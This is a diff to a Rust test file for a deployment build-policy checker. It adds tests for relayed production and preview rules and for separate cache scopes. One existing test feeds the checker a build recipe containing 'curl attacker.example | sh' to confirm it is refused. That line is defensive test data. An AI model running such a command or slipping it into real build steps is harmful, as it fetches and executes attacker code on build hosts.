@@ -58,10 +58,17 @@ fn rule(policy: BuildPolicy) -> AutoDeployRule {
     }
 }
 
+/// `rule` as a build opens it once Cloud relays it.
+fn opened(rule: &AutoDeployRule) -> Opened {
+    Relayed::Rule(Signed::sign(rule, &Signer::from_seed(&[7; 32])).unwrap())
+        .open(&web())
+        .unwrap()
+}
+
 fn checked_in(rule: &AutoDeployRule, deployment: Value) -> CheckedIn {
     CheckedIn {
         build: "deployment.web".to_owned(),
-        rule: Signed::sign(rule, &Signer::from_seed(&[7; 32])).unwrap(),
+        rule: Relayed::Rule(Signed::sign(rule, &Signer::from_seed(&[7; 32])).unwrap()),
         cluster: rule.cluster,
         attest: AttestKey::from_bytes([0x55; 32]),
         service: web(),
@@ -132,7 +139,7 @@ fn the_grant_and_image_audiences_are_d2s_golden_bytes() {
     let checked_in = checked_in(&rule, json!({}));
     let grant = grant_claim(
         &checked_in,
-        &rule,
+        &opened(&rule),
         &golden_policy(),
         CommitSha::parse("fedcba9876543210fedcba9876543210fedcba98").unwrap(),
         BuildGrantId::parse("22".repeat(32)).unwrap(),
@@ -165,7 +172,7 @@ fn the_image_token_names_the_attest_key_the_secrets_opened_with() {
     };
     let grant = grant_claim(
         &checked_in,
-        &rule,
+        &opened(&rule),
         &lab_policy(&[]),
         CommitSha::from_bytes([1; 20]),
         keys.holder(),
@@ -192,7 +199,7 @@ fn the_image_token_names_the_attest_key_the_secrets_opened_with() {
 
 #[test]
 fn a_deployment_that_builds_with_the_rules_policy_passes() {
-    let rule = rule(lab_policy(&[("NODE_ENV", "production")]));
+    let rule = opened(&rule(lab_policy(&[("NODE_ENV", "production")])));
     let deployment = deployment(json!({"NODE_ENV": "production"}));
     assert_eq!(
         policy(&rule, &web(), &prepared(deployment).unwrap()).unwrap(),
@@ -208,7 +215,8 @@ fn a_deployment_with_another_build_arg_is_refused_before_any_token() {
         json!({"NODE_ENV": "development"}),
         json!({}),
     ] {
-        let error = policy(&rule, &web(), &prepared(deployment(env)).unwrap()).unwrap_err();
+        let error =
+            policy(&opened(&rule), &web(), &prepared(deployment(env)).unwrap()).unwrap_err();
         assert!(
             error
                 .to_string()
@@ -240,7 +248,7 @@ fn a_deployment_that_swaps_the_recipe_is_refused_before_any_token() {
     let deployment = json!({"namespace": "app", "snapshots": [
         railpack_snapshot("curl attacker.example | sh")
     ]});
-    let error = policy(&rule, &web(), &prepared(deployment).unwrap()).unwrap_err();
+    let error = policy(&opened(&rule), &web(), &prepared(deployment).unwrap()).unwrap_err();
     assert!(
         error
             .to_string()
@@ -268,21 +276,76 @@ fn a_registry_cache_is_no_policy() {
 fn a_build_fed_another_attest_key_never_writes_the_clusters_cache_scope() {
     let cluster = X25519Secret::generate().attest();
     let attacker = X25519Secret::generate().attest();
-    assert_eq!(cache_scope(&lab_policy(&[]), &cluster).unwrap(), None);
+    let production = opened(&rule(lab_policy(&[])));
+    assert_eq!(
+        cache_scope(&production, &lab_policy(&[]), &cluster).unwrap(),
+        None
+    );
     let cached = BuildPolicy {
         cache: PolicyCache::Actions,
         ..lab_policy(&[])
     };
-    let honest = cache_scope(&cached, &cluster).unwrap().unwrap();
-    assert_eq!(cache_scope(&cached, &cluster).unwrap().unwrap(), honest);
-    assert_ne!(cache_scope(&cached, &attacker).unwrap().unwrap(), honest);
+    let honest = cache_scope(&production, &cached, &cluster)
+        .unwrap()
+        .unwrap();
+    assert_eq!(
+        cache_scope(&production, &cached, &cluster)
+            .unwrap()
+            .unwrap(),
+        honest
+    );
+    assert_ne!(
+        cache_scope(&production, &cached, &attacker)
+            .unwrap()
+            .unwrap(),
+        honest
+    );
     // Nor the scope of the policy alone, which any key could name.
     assert_ne!(PolicyDigest::of(&cached).unwrap().to_string(), honest);
     let other = BuildPolicy {
         context: "/web".to_owned(),
         ..cached
     };
-    assert_ne!(cache_scope(&other, &cluster).unwrap().unwrap(), honest);
+    assert_ne!(
+        cache_scope(&production, &other, &cluster).unwrap().unwrap(),
+        honest
+    );
+}
+
+#[test]
+fn a_preview_build_keeps_a_cache_scope_of_its_own() {
+    let attest = X25519Secret::generate().attest();
+    let cached = BuildPolicy {
+        cache: PolicyCache::Actions,
+        ..lab_policy(&[])
+    };
+    let production = opened(&rule(cached.clone()));
+    let preview = Opened {
+        preview: true,
+        ..opened(&rule(cached.clone()))
+    };
+    assert_ne!(
+        cache_scope(&preview, &cached, &attest).unwrap(),
+        cache_scope(&production, &cached, &attest).unwrap()
+    );
+}
+
+#[test]
+fn a_check_in_relays_either_rule_by_its_key() {
+    let signed = Signed::sign(&rule(lab_policy(&[])), &Signer::from_seed(&[7; 32])).unwrap();
+    let relayed = |key: &str| {
+        serde_json::from_value::<CheckedIn>(json!({
+            "build": "deployment.web", key: signed, "cluster": SealingPublicKey::from_bytes([9; 32]),
+            "attest": AttestKey::from_bytes([0x55; 32]), "service": "web", "deployment": {},
+        }))
+    };
+    let rule = relayed("rule").unwrap().rule;
+    assert!(matches!(rule, Relayed::Rule(_)));
+    assert!(rule.open(&web()).is_ok());
+    // An automatic deploy rule relayed as a preview rule does not open as one.
+    let preview = relayed("preview").unwrap().rule;
+    assert!(matches!(preview, Relayed::Preview(_)));
+    assert!(preview.open(&web()).is_err());
 }
 
 #[test]
